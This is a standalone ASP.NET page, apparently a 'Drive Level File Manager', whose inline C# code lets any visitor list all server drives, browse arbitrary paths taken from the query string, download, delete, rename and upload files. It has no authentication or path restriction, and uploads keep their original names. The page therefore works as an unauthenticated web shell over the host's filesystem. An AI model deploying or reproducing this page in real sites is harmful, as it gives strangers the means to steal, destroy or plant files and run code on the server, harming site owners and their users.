<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.IO" %>
<!DOCTYPE html>
<html>
<head>
    <title>Drive Level File Manager</title>
</head>
<body>
    <form id="form1" runat="server">
        <h2>Drive Level File Manager</h2>

        <asp:Label ID="lblPath" runat="server" Font-Bold="true"></asp:Label><br />

        <asp:Button ID="btnGoBack" runat="server" Text="Go Back" OnClick="btnGoBack_Click" /><br /><br />

        <asp:GridView ID="gvFiles" runat="server" AutoGenerateColumns="False" OnRowCommand="gvFiles_RowCommand">
            <Columns>
                <asp:BoundField DataField="Name" HeaderText="Name" />
                <asp:BoundField DataField="Type" HeaderText="Type" />
                <asp:BoundField DataField="Size" HeaderText="Size (KB)" />
                <asp:ButtonField CommandName="Open" Text="Open/Download" ButtonType="Button" />
                <asp:ButtonField CommandName="Delete" Text="Delete" ButtonType="Button" />
                <asp:ButtonField CommandName="Rename" Text="Rename" ButtonType="Button" />
            </Columns>
        </asp:GridView>

        <br />

        <asp:TextBox ID="txtNewFolder" runat="server" placeholder="New Folder Name"></asp:TextBox>
        <asp:Button ID="btnCreateFolder" runat="server" Text="Create Folder" OnClick="btnCreateFolder_Click" />

        <br /><br />

        <asp:FileUpload ID="fileUpload" runat="server" />
        <asp:Button ID="btnUpload" runat="server" Text="Upload" OnClick="btnUpload_Click" />

        <br /><br />

        <asp:Panel ID="pnlRename" runat="server" Visible="false">
            <asp:TextBox ID="txtRename" runat="server"></asp:TextBox>
            <asp:Button ID="btnRenameOk" runat="server" Text="OK" OnClick="btnRenameOk_Click" />
            <asp:Button ID="btnRenameCancel" runat="server" Text="Cancel" OnClick="btnRenameCancel_Click" />
        </asp:Panel>

        <asp:HiddenField ID="hfCurrentPath" runat="server" />
        <asp:HiddenField ID="hfRenameOldName" runat="server" />

    </form>

    <script runat="server">

        string currentPath;

        protected void Page_Load(object sender, EventArgs e)
        {
            if (!IsPostBack)
            {
                string path = Request.QueryString["path"];
                if (string.IsNullOrEmpty(path))
                {
                    currentPath = null; // Means show drives
                }
                else
                {
                    currentPath = path;
                }
                hfCurrentPath.Value = currentPath;
                BindGrid();
            }
            else
            {
                currentPath = hfCurrentPath.Value;
            }
        }

        void BindGrid()
        {
            if (string.IsNullOrEmpty(currentPath))
            {
                // Show drives
                var drives = DriveInfo.GetDrives();
                var list = new System.Collections.Generic.List<dynamic>();
                foreach (var d in drives)
                {
                    list.Add(new
                    {
                        Name = d.Name,
                        Type = "Drive",
                        Size = (d.IsReady) ? (d.TotalSize / 1024 / 1024).ToString("N0") : "N/A",
                        FullPath = d.Name
                    });
                }
                gvFiles.DataSource = list;
                gvFiles.DataBind();
                lblPath.Text = "Drives:";
            }
            else
            {
                // Show directory contents
                var list = new System.Collections.Generic.List<dynamic>();

                try
                {
                    foreach (var dir in Directory.GetDirectories(currentPath))
                    {
                        DirectoryInfo di = new DirectoryInfo(dir);
                        list.Add(new
                        {
                            Name = "[DIR] " + di.Name,
                            Type = "Folder",
                            Size = "",
                            FullPath = dir
                        });
                    }

                    foreach (var file in Directory.GetFiles(currentPath))
                    {
                        FileInfo fi = new FileInfo(file);
                        list.Add(new
                        {
                            Name = fi.Name,
                            Type = "File",
                            Size = (fi.Length / 1024).ToString("N0"),
                            FullPath = file
                        });
                    }
                }
                catch (Exception ex)
                {
                    // Handle access exceptions, etc.
                    lblPath.Text = "Error: " + ex.Message;
                }

                gvFiles.DataSource = list;
                gvFiles.DataBind();
                lblPath.Text = "Path: " + currentPath;
            }
        }

        protected void gvFiles_RowCommand(object sender, System.Web.UI.WebControls.GridViewCommandEventArgs e)
        {
            int index = Convert.ToInt32(e.CommandArgument);
            if (string.IsNullOrEmpty(currentPath))
            {
                // Drives list
                var drives = DriveInfo.GetDrives();
                if (index >= 0 && index < drives.Length)
                {
                    string driveName = drives[index].Name;
                    currentPath = driveName;
                    hfCurrentPath.Value = currentPath;
                    Response.Redirect(Request.Path + "?path=" + Server.UrlEncode(currentPath));
                }
            }
            else
            {
                var items = new System.Collections.Generic.List<dynamic>();

                foreach (var dir in Directory.GetDirectories(currentPath))
                {
                    DirectoryInfo di = new DirectoryInfo(dir);
                    items.Add(new
                    {
                        Name = "[DIR] " + di.Name,
                        Type = "Folder",
                        Size = "",
                        FullPath = dir
                    });
                }

                foreach (var file in Directory.GetFiles(currentPath))
                {
                    FileInfo fi = new FileInfo(file);
                    items.Add(new
                    {
                        Name = fi.Name,
                        Type = "File",
                        Size = (fi.Length / 1024).ToString("N0"),
                        FullPath = file
                    });
                }

                if (index < 0 || index >= items.Count) return;

                var item = items[index];

                if (e.CommandName == "Open")
                {
                    if (item.Type == "Folder")
                    {
                        currentPath = item.FullPath;
                        hfCurrentPath.Value = currentPath;
                        Response.Redirect(Request.Path + "?path=" + Server.UrlEncode(currentPath));
                    }
                    else
                    {
                        // Download file
                        Response.ContentType = "application/octet-stream";
                        Response.AppendHeader("Content-Disposition", "attachment; filename=" + Path.GetFileName(item.FullPath));
                        Response.TransmitFile(item.FullPath);
                        Response.End();
                    }
                }
                else if (e.CommandName == "Delete")
                {
                    try
                    {
                        if (item.Type == "Folder")
                            Directory.Delete(item.FullPath, true);
                        else
                            File.Delete(item.FullPath);
                    }
                    catch (Exception ex)
                    {
                        lblPath.Text = "Delete Error: " + ex.Message;
                    }
                    BindGrid();
                }
                else if (e.CommandName == "Rename")
                {
                    pnlRename.Visible = true;
                    txtRename.Text = item.Name.Replace("[DIR] ", "");
                    hfRenameOldName.Value = item.FullPath;
                }
            }
        }

        protected void btnGoBack_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(currentPath))
            {
                // Already at drives level, no parent
                return;
            }
            else
            {
                DirectoryInfo parent = Directory.GetParent(currentPath);
                if (parent == null)
                {
                    // Go to drives list
                    currentPath = null;
                }
                else
                {
                    currentPath = parent.FullName;
                }
                hfCurrentPath.Value = currentPath;
                Response.Redirect(Request.Path + (currentPath == null ? "" : "?path=" + Server.UrlEncode(currentPath)));
            }
        }

        protected void btnCreateFolder_Click(object sender, EventArgs e)
        {
            if (!string.IsNullOrEmpty(currentPath) && !string.IsNullOrWhiteSpace(txtNewFolder.Text))
            {
                try
                {
                    string newFolderPath = Path.Combine(currentPath, txtNewFolder.Text.Trim());
                    if (!Directory.Exists(newFolderPath))
                        Directory.CreateDirectory(newFolderPath);
                }
                catch (Exception ex)
                {
                    lblPath.Text = "Create Folder Error: " + ex.Message;
                }
                txtNewFolder.Text = "";
                BindGrid();
            }
        }

        protected void btnUpload_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(currentPath))
            {
                lblPath.Text = "Please select a folder to upload files.";
                return;
            }

            if (fileUpload.HasFile)
            {
                try
                {
                    string savePath = Path.Combine(currentPath, Path.GetFileName(fileUpload.FileName));
                    fileUpload.SaveAs(savePath);
                }
                catch (Exception ex)
                {
                    lblPath.Text = "Upload Error: " + ex.Message;
                }
                BindGrid();
            }
        }

        protected void btnRenameOk_Click(object sender, EventArgs e)
        {
            string oldPath = hfRenameOldName.Value;
            string newName = txtRename.Text.Trim();

            if (string.IsNullOrEmpty(oldPath) || string.IsNullOrEmpty(newName))
            {
                pnlRename.Visible = false;
                return;
            }

            try
            {
                string newPath = Path.Combine(Path.GetDirectoryName(oldPath), newName);

                if (Directory.Exists(oldPath))
                {
                    Directory.Move(oldPath, newPath);
                }
                else if (File.Exists(oldPath))
                {
                    File.Move(oldPath, newPath);
                }
            }
            catch (Exception ex)
            {
                lblPath.Text = "Rename Error: " + ex.Message;
            }

            pnlRename.Visible = false;
            BindGrid();
        }

        protected void btnRenameCancel_Click(object sender, EventArgs e)
        {
            pnlRename.Visible = false;
        }
    </script>
</body>
</html>
